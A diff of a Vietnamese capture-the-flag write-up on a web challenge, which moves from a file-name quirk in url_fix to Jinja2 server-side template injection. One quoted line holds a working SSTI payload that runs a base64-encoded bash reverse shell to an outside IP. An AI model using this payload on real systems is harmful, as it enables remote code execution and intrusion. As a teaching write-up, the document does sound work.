@@ -12,7 +12,9 @@ Nó kiểm tra nội dung đã nhập và sau đó tạo một tệp HTML tươn
 
 ![image](https://github.com/Aowpu/CTF/assets/130723782/65f6f399-7e9d-4921-9916-f6a246f869b7)
 - Tệp index.html cho thấy thấy rằng nó sẽ hiện ra lỗi nếu có nên tôi đã thử cho error là 1 thứ gì đó bất kì
+  
 ![image](https://github.com/Aowpu/CTF/assets/130723782/ab45f4b9-aee2-460f-aa8e-1e05ef4cced5)
+
 ![image](https://github.com/Aowpu/CTF/assets/130723782/5fea4dff-f48f-4915-821a-a6d5551bc0d7)
 - Trong đoạn code trên có thể thấy nó đã tạo tệp name, tên của tệp là 128 kí tự đầu tiên của nội dung và mã thông báo ngẫu nhiên
 - Có một điều rằng chúng ta có thể dựa trên url_fix(content[:128]) cho thấy khi tìm kiếm thì url_fix sẽ biến \ thành / mà ở trong
@@ -26,7 +28,7 @@ Nó kiểm tra nội dung đã nhập và sau đó tạo một tệp HTML tươn
   ![image](https://github.com/Aowpu/CTF/assets/130723782/2754cf1e-4b42-4938-9797-780ad7e1056c)
 - Payload đã được in lại
 - Chúng ta có thể sử dụng SSTI(Sever-side template injection) để truy xuất cờ.
-- Tôi đã tìm thấy bài viết trong hacktricks về cách khai thác lỗ hổng SSTI này ở bài Jinja2 SSTI và câu lệnh dùng để injection vào hệ thống
+- Tôi đã tìm thấy bài viết trong hacktricks ( https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti ) về cách khai thác lỗ hổng SSTI này ở bài Jinja2 SSTI và câu lệnh dùng để injection vào hệ thống
 - "{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}"
 - Sau khi đọc dòng lệnh trên tôi đã thay đổi 1 số chỗ để phù hợp với bài này, đoạn mã hóa base 64 ở câu lệnh trên tôi sẽ đổi nó bởi vì theo Dockerfile được cung cấp cho thấy tệp chứa cờ nằm trong thư mục gốc của UUID ngẫu nhiên.
 Vì vậy chùng ta cần tìm tên file của lá cờ
